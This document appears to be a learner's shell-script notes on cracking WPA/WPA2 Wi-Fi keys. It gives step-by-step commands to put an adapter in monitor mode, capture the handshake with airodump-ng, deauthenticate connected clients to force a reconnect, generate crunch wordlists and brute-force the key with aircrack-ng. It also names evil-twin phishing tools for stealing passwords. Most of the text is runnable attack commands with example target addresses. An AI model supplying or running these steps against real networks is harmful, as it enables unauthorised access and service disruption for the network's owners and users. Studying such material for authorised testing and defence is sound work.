:'
    in WPA2, keys are unique and they are temporary
    therefore the packets sent in the air contain no information 
    that is useful for us
    so even if we capture one million packets we cant use them to crack the key

    the only packets that can aid with the cracking process are the handshake packets.
    these are four packts which are transferred between a client and router when the client
    connects to the network

    so we have to capture these packets
    then use them to crack the WPA or the WPA2 key
'

# First set your wireless adapter to monitor mode
ifconfig wlan0 down

airmon-ng check kill

iwconfig wlan0 mode monitor

ifconfig wlan0 up

# then run airodump-ng to list all the network around you
airodump-ng --band abg wlan0

# now we're going to target this network only using the airodump
airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write wpa_handshake mon0

# All we have to do is to sit and wait for the handshake to be captured
# And you have to know that a handshake is made when a client connects to the network
# So we have to wait for a new client to connect to the network
# When the handshake happens, you'll see something similar to this:

:'
    CH  6 ][ Elapsed: 2 mins ][ 2023-05-11 02:15 ][ WPA handshake: 00:11:22:33:44:55
'
# if we don't want to wait for long, we can use the deauthentication attack
# we will tentatively disconnect a client from the network using the deauth attack
# and they will automatically reconnect to the network thus sending the handshake

airplay-ng --deauth <no of deauthentication packets> -a <mac address of target> -c <mac address of the client/station that we want to disconnect> <name of wireless adapter in monitor mode>
airplay-ng --deauth 4 -a 00:10:18:90:2D:EE -c 80:E6:50:22:A2:E8 mon0

# the handshake does not contain data that helps recover the key
# it contains data that can be used to check if a key is valid or not
# so we have to create a wordlist
# you can create your own wordlist using a tool called crunch

crunch [min] [max] [characters] -t [pattern] -o [filename]
crunch 6 8 123abc$ -o wordlist -t a@@@@b

# the above cruch will generate a list of characters that start from 6-8 characters
# it will create a wordlist using 123abc$ characters only
# -t tag/flag is used to specify a pattern, let's say you saw a person entering their password 
# and it started with a, you can specify the pattern to start with a and ended with b for instance etc.
# so all the generated password will start with a and end with b

:'
    wget ftp://ftp.openwall.com/pub/wordlists/wordlist.zip

    ftp://ftp.openwall.com/pub/wordlists/
    http://www.openwall.com/mirrors/
    https://github.com/danielmiessler/SecLists
    http://www.outpost9.com/files/WordLists.html
    http://www.vulnerabilityassessment.co.uk/passwords.htm
    http://packetstormsecurity.org/Crackers/wordlists/
    http://www.ai.uga.edu/ftplib/natural-language/moby/
    http://www.cotse.com/tools/wordlists1.htm
    http://www.cotse.com/tools/wordlists2.htm
    http://wordlist.sourceforge.net/
'
# now that we have the passwords in the wordlist, we can now try to check if the user
# uses any passwords that we have on our wordlist 
aircrack-ng <name of capture file> -w <wordlist>
aircrack-ng file.cap -w test.txt

# we also have online services that you can upload the handshake and try to hack the password
# e.g. CloudCracker and OnlineHashCrack

# alternatively, to speed up the process, you can use
# 1. GPU instead of CPU for the cracking process
# 2. you can also use rainbow tables
# 3. you can also pipe the wordlist as it is being created in cruch to aircrack-ng
#    this way you can create bigger wordlists without using any storage in your computer
# 4. there are methods to pause your cracking process and resume later without loosing progress
# 5. you can also use social engineering and through an evil twin attack to trick one of the users to give you the password


# an example of directly piping crunch is as follows
# The "-" at the end of the command tells aircrack-ng to read the wordlist from standard input (i.e. the pipe) instead of from a file.
crunch <min_length> <max_length> <character_set> | aircrack-ng file.cap -w - 
crunch <min_length> <max_length> <character_set> | aircrack-ng -b <bssid> -w -

:'
    To carry out an evil twin attack, you would need to use a different tool that is 
    specifically designed for that purpose, such as airgeddon, wifiphisher, or Fluxion. 
    These tools automate the process of creating a fake access point and performing a man-in-the-middle 
    attack to intercept network traffic and steal sensitive information.
'
